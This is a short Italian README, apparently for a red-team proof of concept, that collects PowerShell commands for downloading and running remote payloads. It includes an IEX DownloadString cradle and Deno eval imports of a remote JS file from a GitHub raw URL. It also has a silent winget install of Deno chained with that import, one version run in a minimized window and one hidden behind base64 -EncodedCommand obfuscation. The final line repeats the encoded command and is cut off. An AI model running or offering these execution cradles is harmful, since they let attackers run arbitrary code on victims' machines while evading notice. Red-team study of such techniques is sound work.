# p-o-c

Comando PowerShell per esecuzione payload letto via HTTP:
``` powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/roccosicilia/HAPpy/refs/heads/main/demo/DenoJS/remote.ps1')"
```

Comando per invocare l'esecuzione di uno JS con Deno con importazione ed esecuzione di un contenuto letto via HTTP:
``` powershell
deno eval --allow-net=test "import('https://raw.githubusercontent.com/roccosicilia/HAPpy/refs/heads/main/demo/DenoJS/remote.js')"
```

Payload di test per installare Deno con winget, lanciare il payload tramite chiamata http:
``` powershell
winget install deno
$env:Path = [System.Environment]::GetEnvironmentVariable("Path", "User") + ";" + [System.Environment]::GetEnvironmentVariable("Path", "Machine")
deno eval --allow-net=test "import('https://raw.githubusercontent.com/roccosicilia/HAPpy/refs/heads/main/demo/DenoJS/remote.js')"
```

Versione in linea:
``` powershell
powershell.exe -NoProfile -WindowStyle Minimized -Command "winget install --id DenoLand.Deno --exact --silent --accept-source-agreements --accept-package-agreements; `$env:Path=[System.Environment]::GetEnvironmentVariable('Path','User')+';'+[System.Environment]::GetEnvironmentVariable('Path','Machine'); deno eval --allow-scripts 'import(''https://raw.githubusercontent.com/roccosicilia/HAPpy/refs/heads/main/demo/DenoJS/remote.js'')'"

powershell.exe -NoProfile -WindowStyle Minimized -Command "winget install deno --exact --silent --accept-source-agreements --accept-package-agreements; `$env:Path=[System.Environment]::GetEnvironmentVariable('Path','User')+';'+[System.Environment]::GetEnvironmentVariable('Path','Machine'); deno eval --allow-scripts 'import(''https://raw.githubusercontent.com/roccosicilia/HAPpy/refs/heads/main/demo/DenoJS/remote.js'')'"

```

Versione encoded:
``` powershell
powershell.exe -NoProfile -WindowStyle Minimized -EncodedCommand IndpbmdldCBpbnN0YWxsIC0taWQgRGVub0xhbmQuRGVubyAtLWV4YWN0IC0tc2lsZW50IC0tYWNjZXB0LXNvdXJjZS1hZ3JlZW1lbnRzIC0tYWNjZXB0LXBhY2thZ2UtYWdyZWVtZW50czsgYCRlbnY6UGF0aD1bU3lzdGVtLkVudmlyb25tZW50XTo6R2V0RW52aXJvbm1lbnRWYXJpYWJsZSgnUGF0aCcsJ1VzZXInKSsnOycrW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEVudmlyb25tZW50VmFyaWFibGUoJ1BhdGgnLCdNYWNoaW5lJyk7IGRlbm8gZXZhbCAtLWFsbG93LXNjcmlwdHMgJ2ltcG9ydCgnJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yb2Njb3NpY2lsaWEvSEFQcHkvcmVmcy9oZWFkcy9tYWluL2RlbW8vRGVub0pTL3JlbW90ZS5qcycnKSci
```

powershell.exe -NoProfile -WindowStyle Minimized -EncodedCommand IndpbmdldCBpbnN0YWxsIC0taWQgRGVub0xhbmQuRGVubyAtLWV4YWN0IC0tc2lsZW50IC0tYWNjZXB0LXNvdXJjZS1hZ3JlZW1lbnRzIC0tYWNjZXB0LXBhY2thZ2UtYWdyZWVtZW50czsgYCRlbnY6UGF0aD1bU3lzdGVtLkVudmlyb25tZW50XTo6R2V0RW